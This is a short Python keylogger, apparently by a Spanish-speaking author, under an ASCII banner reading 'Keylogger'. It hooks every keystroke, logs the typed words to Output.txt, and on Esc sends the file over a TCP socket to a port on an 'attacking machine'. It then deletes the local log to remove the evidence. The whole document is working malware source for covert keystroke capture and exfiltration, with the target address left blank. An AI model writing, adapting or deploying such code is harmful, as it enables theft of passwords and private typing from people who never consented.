print("""
 ____  __.             .__                                     
|    |/ _|____ ___.__. |  |   ____   ____   ____   ___________   \n
|      <_/ __ <   |  | |  |  /  _ \ / ___\ / ___\_/ __ \_  __ \ 
|    |  \  ___/\___  | |  |_(  <_> ) /_/  > /_/  >  ___/|  | \/
|____|__ \___  > ____| |____/\____/\___  /\___  / \___  >__|   
        \/   \/\/                /_____//_____/      \/          
      """)

import keyboard
import sys
import socket
import os

palabra = ""

def pulsacion_tecla(pulsacion): 

    global palabra

    if pulsacion.event_type == keyboard.KEY_DOWN:
    
        if pulsacion.name == 'space':
            guardar_palabra_al_espacio()
        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable(): 
            palabra += pulsacion.name

keyboard.hook(pulsacion_tecla)

def guardar_palabra_al_espacio():
    
    with open("Output.txt", "a") as file: 
        file.write(palabra + "\n")
    print(f'Palabra registrada: {palabra}')
    resetear_palabra() 

def resetear_palabra():
    global palabra
    palabra = ""

def enviar_archivo_via_sockets(archivo, direccion_ip, puerto):
    try:
        with open(archivo, 'rb') as file:
            contenido = file.read()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((direccion_ip, puerto))
            s.sendall(contenido)
            os.remove("Output.txt")
            sys.exit()

    except Exception as e:
        print(f"Error al enviar el archivo: {e}")

def detener_script():
    print("Enviamos datos a la máquina atacante")
    keyboard.unhook_all()  
    enviar_archivo_via_sockets(archivo_a_enviar, direccion_ip_destino, puerto_destino)

direccion_ip_destino = ' '
puerto_destino = 9000
archivo_a_enviar = 'Output.txt'

try:
    keyboard.wait('esc')
    detener_script()
except KeyboardInterrupt:
    print(' Script Detenido ')
    pass
